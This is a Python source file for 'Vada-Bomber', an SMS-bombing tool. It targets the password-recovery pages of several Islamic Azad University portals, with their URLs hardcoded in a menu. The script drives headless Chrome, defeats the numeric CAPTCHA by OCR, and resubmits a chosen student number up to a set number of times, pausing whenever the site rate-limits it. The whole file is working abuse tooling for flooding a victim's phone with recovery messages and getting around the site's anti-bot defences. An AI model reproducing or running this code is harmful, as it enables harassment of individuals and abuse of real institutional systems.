import os
import re
import sys
import time
import signal
import shutil
import warnings
from datetime import datetime

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import NoSuchElementException, TimeoutException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

from PIL import Image
import pytesseract

from rich.console import Console
from rich.live import Live
from rich.panel import Panel
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn, SpinnerColumn
from rich.table import Table
from rich.text import Text

warnings.filterwarnings("ignore", category=DeprecationWarning)

# ---------------- Utils ----------------
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS 
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def timestamp():
    return datetime.now().strftime("%H:%M:%S")

# ---- Tesseract detection ----
def detect_tesseract_cmd():
    env_cmd = os.environ.get("TESSERACT_CMD")
    if env_cmd and os.path.isfile(env_cmd) and os.access(env_cmd, os.X_OK):
        return env_cmd
    path = shutil.which("tesseract")
    if path:
        return path
    bundle = resource_path("tesseract")
    if os.path.exists(bundle):
        return bundle
    return None

def detect_tessdata_dir():
    for key in ["TESSDATA_PREFIX", "TESSDATA_DIR"]:
        val = os.environ.get(key)
        if val and os.path.isdir(val):
            return val
    candidates = [
        "/usr/share/tesseract-ocr/4.00/tessdata",
        "/usr/share/tesseract-ocr/tessdata",
        "/usr/share/tessdata",
        "/usr/local/share/tessdata",
        "/data/data/com.termux/files/usr/share/tessdata",
    ]
    for p in candidates:
        if os.path.isdir(p):
            return p
    bundled = resource_path("tessdata")
    if os.path.isdir(bundled):
        return bundled
    return None

# ---- Chrome/Chromedriver detection ----
def detect_chrome_binary():
    env_cmd = os.environ.get("CHROME_BINARY") or os.environ.get("CHROMIUM_BINARY")
    if env_cmd and os.path.isfile(env_cmd) and os.access(env_cmd, os.X_OK):
        return env_cmd
    for name in ["google-chrome", "chrome", "chromium", "chromium-browser"]:
        path = shutil.which(name)
        if path:
            return path
    for p in [
        "/usr/bin/google-chrome",
        "/usr/bin/google-chrome-stable",
        "/usr/bin/chromium",
        "/usr/bin/chromium-browser",
        "/snap/bin/chromium",
    ]:
        if os.path.isfile(p) and os.access(p, os.X_OK):
            return p
    return None

def detect_chromedriver():
    env_path = os.environ.get("CHROMEDRIVER")
    if env_path and os.path.isfile(env_path) and os.access(env_path, os.X_OK):
        return env_path
    path = shutil.which("chromedriver")
    if path:
        return path
    for p in ["/usr/bin/chromedriver", "/usr/local/bin/chromedriver", "/snap/bin/chromedriver"]:
        if os.path.isfile(p) and os.access(p, os.X_OK):
            return p
    bundled = resource_path("chromedriver")
    if os.path.exists(bundled):
        return bundled
    return None

# --------------- Core class ---------------
class SMSBomber:
    def __init__(self, vadana_url):
        self.chrome_options = webdriver.ChromeOptions()
        self.chrome_options.add_argument("--headless=new")
        self.chrome_options.add_argument("--no-sandbox")
        self.chrome_options.add_argument("--disable-gpu")
        self.chrome_options.add_argument("--disable-dev-shm-usage")
        self.chrome_options.add_argument("--window-size=1024,768")
        self.chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
        chrome_binary = detect_chrome_binary()
        if chrome_binary:
            self.chrome_options.binary_location = chrome_binary
        self.chrome_options.add_argument(
            "--user-agent=Mozilla/5.0 (X11; Linux x86_64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/120.0.0.0 Safari/537.36"
        )

        self.driver = None
        self.vadana_url = vadana_url

        self.tesseract_cmd = detect_tesseract_cmd()
        if self.tesseract_cmd:
            pytesseract.pytesseract.tesseract_cmd = self.tesseract_cmd
        self.tessdata_dir = detect_tessdata_dir()

    def start_driver(self):
        if self.driver is not None:
            return None
        driver_path = detect_chromedriver()
        try:
            if driver_path:
                service = Service(executable_path=driver_path)
                self.driver = webdriver.Chrome(service=service, options=self.chrome_options)
            else:
                self.driver = webdriver.Chrome(options=self.chrome_options)
            self.driver.set_page_load_timeout(25)
            return None
        except Exception:
            return "WebDriver start failed"

    def stop_driver(self):
        if self.driver is not None:
            self.driver.quit()
            self.driver = None
        for file in ["full_screenshot.png", "captcha_image.png", "captcha_binary.png"]:
            if os.path.exists(file):
                try:
                    os.remove(file)
                except OSError:
                    pass

    def solve_captcha(self):
        try:
            img = WebDriverWait(self.driver, 15).until(
                EC.presence_of_element_located((By.XPATH, "//label[@id='captcha-label']/img"))
            )
            img.screenshot("captcha_image.png")
            image = Image.open("captcha_image.png").convert("L")
            threshold = 128
            binary_image = image.point(lambda x: 0 if x < threshold else 255, '1')

            tessdata_dir_config = f'--tessdata-dir "{self.tessdata_dir}"' if self.tessdata_dir else ""
            config = f'--psm 7 --oem 3 -c tessedit_char_whitelist=0123456789 {tessdata_dir_config}'.strip()

            captcha_text = pytesseract.image_to_string(binary_image, config=config).strip()
            captcha_text = re.sub(r"\D", "", captcha_text)

            return captcha_text if len(captcha_text) >= 4 else None
        except Exception:
            return None

    def recover_password(self, student_number):
        try:
            self.driver.get(self.vadana_url)
            WebDriverWait(self.driver, 15).until(EC.presence_of_element_located((By.NAME, "username")))
            u = self.driver.find_element(By.NAME, "username")
            u.clear()
            u.send_keys(student_number)

            captcha_text = self.solve_captcha()
            if captcha_text:
                try:
                    cap = self.driver.find_element(By.NAME, "captcha")
                    cap.clear()
                    cap.send_keys(captcha_text)
                except NoSuchElementException:
                    pass

            self.driver.find_element(By.ID, "loginBtn").click()
            time.sleep(1.8)

            try:
                WebDriverWait(self.driver, 6).until(
                    EC.presence_of_element_located(
                        (By.XPATH, "//div[@id='login-alert-section']/div[contains(@class, 'alert-success')]")
                    )
                )
                return True, None
            except TimeoutException:
                try:
                    error_element = self.driver.find_element(By.XPATH, "//div[contains(@class, 'alert-danger')]")
                    error_text = error_element.text
                    if ("کد امنیتی نامعتبر است" in error_text) or ("invalid security code" in error_text.lower()):
                        return False, "Invalid captcha"
                    elif ("محدودیت" in error_text) or ("limit" in error_text.lower()):
                        return False, "Rate limited"
                    else:
                        return False, "Unknown website error"
                except NoSuchElementException:
                    return False, "Unknown response"
        except TimeoutException:
            return False, "Page timeout"
        except Exception:
            return False, "Unexpected error"

# --------------- UI / Minimal Output + Clear & Banner ---------------
ASCII_BANNER = r"""
██╗   ██╗ █████╗ ██████╗  █████╗
██║   ██║██╔══██╗██╔══██╗██╔══██╗
██║   ██║███████║██║  ██║███████║
╚██╗ ██╔╝██╔══██║██║  ██║██╔══██║
 ╚████╔╝ ██║  ██║██████╔╝██║  ██║
  ╚═══╝  ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝
██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗
██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
            by Zodiac (github.com/Zudiaq)
"""

def display_system_menu(console: Console):
    systems = {
        1: {"name": "IAU Central Tehran Branch", "url": "https://vadana46.ec.iau.ir/p/4033/login/recover_password.php"},
        2: {"name": "IAU North Tehran Branch", "url": "https://vadana52.ec.iau.ir/p/4033/login/recover_password.php"},
        3: {"name": "IAU East Tehran Branch", "url": "https://vadana36.ec.iau.ir/p/4033/login/recover_password.php"},
        4: {"name": "IAU West Tehran Branch", "url": "https://vadana13.ec.iau.ir/p/4033/login/recover_password.php"},
        5: {"name": "IAU Yadegar Imam Branch", "url": "https://vadana31.ec.iau.ir/p/4033/login/recover_password.php"},
        6: {"name": "IAU Parand Branch", "url": "https://vadana16.ec.iau.ir/p/4033/login/recover_password.php"},
        7: {"name": "IAU Ghods City Branch", "url": "https://vadana33.ec.iau.ir/p/4033/login/recover_password.php"},
        8: {"name": "IAU Shahryar Branch", "url": "https://vadana37.ec.iau.ir/p/4033/login/recover_password.php"},
        9: {"name": "Manual", "url": None}
    }
    console.print("[bold magenta]Vada-Bomber[/bold magenta]")
    for key, system in systems.items():
        console.print(f"[yellow]{key}[/yellow] {system['name']}")
    while True:
        try:
            choice = int(console.input("[cyan]Choice: [/cyan]"))
            if choice in systems:
                selected_system = systems[choice]
                if choice == 9:
                    return console.input("[cyan]Custom URL: [/cyan]").strip()
                return selected_system["url"]
            else:
                console.print("[red]Invalid choice[/red]")
        except ValueError:
            console.print("[red]Enter a number[/red]")

def main():
    console = Console()
    clear_screen()
    vadana_url = display_system_menu(console)
    student_number = console.input("[cyan]Student number: [/cyan]")
    try:
        max_attempts = int(console.input("[cyan]Max attempts (default 100): [/cyan]") or "100")
    except ValueError:
        max_attempts = 100

    clear_screen()
    console.print(ASCII_BANNER, style="cyan")

    # Counters
    success_count = 0
    attempt_count = 0
    rate_limited = 0
    captcha_fail = 0
    unknown_err = 0

    progress = Progress(
        SpinnerColumn(style="bold magenta"),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=None, style="bold blue"),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TimeElapsedColumn(),
        TimeRemainingColumn(),
    )
    task = progress.add_task("Sending...", total=max_attempts)

    log_lines = []
    LOG_MAX = 5

    def push_error(msg: str):
        nonlocal log_lines
        if not msg:
            return
        log_lines.append(f"[red]{msg}[/red]")
        if len(log_lines) > LOG_MAX:
            log_lines.pop(0)

    def stats_text():
        return Text.from_markup(
            f"[green]OK[/green]: {success_count}  "
            f"[cyan]Tried[/cyan]: {attempt_count}/{max_attempts}  "
            f"[yellow]RateLimit[/yellow]: {rate_limited}  "
            f"[magenta]CaptchaFail[/magenta]: {captcha_fail}  "
            f"[white]OtherErr[/white]: {unknown_err}"
        )

    def render_layout():
        layout = Table.grid(expand=True)
        layout.add_row(stats_text())
        layout.add_row(progress)
        logs_panel = Panel(
            Text("\n".join(log_lines) if log_lines else "No errors", justify="left"),
            title="Logs",
            border_style="dim"
        )
        layout.add_row(logs_panel)
        return layout

    bomber = SMSBomber(vadana_url)
    err = bomber.start_driver()
    if err:
        push_error("WebDriver could not start")
        with Live(render_layout(), console=console, refresh_per_second=8, screen=False, transient=False) as live:
            time.sleep(2)
        clear_screen()
        return

    should_exit = False

    def signal_handler(sig, frame):
        nonlocal should_exit
        should_exit = True

    signal.signal(signal.SIGINT, signal_handler)

    with Live(render_layout(), console=console, refresh_per_second=8, screen=False, transient=False) as live:
        while not should_exit and attempt_count < max_attempts:
            attempt_count += 1

            ok, msg = bomber.recover_password(student_number)
            if ok:
                success_count += 1
            else:
                if msg == "Rate limited":
                    rate_limited += 1
                    push_error("Rate limited; waiting 30s")
                elif msg == "Invalid captcha":
                    captcha_fail += 1
                else:
                    unknown_err += 1
                    if msg:
                        push_error(msg)

            progress.update(task, advance=1, description="Sending...")
            live.update(render_layout())

            if not ok and msg == "Rate limited":
                for _ in range(30):
                    if should_exit:
                        break
                    time.sleep(1)
                    live.update(render_layout())

    bomber.stop_driver()
    clear_screen()

if __name__ == "__main__":
    main()

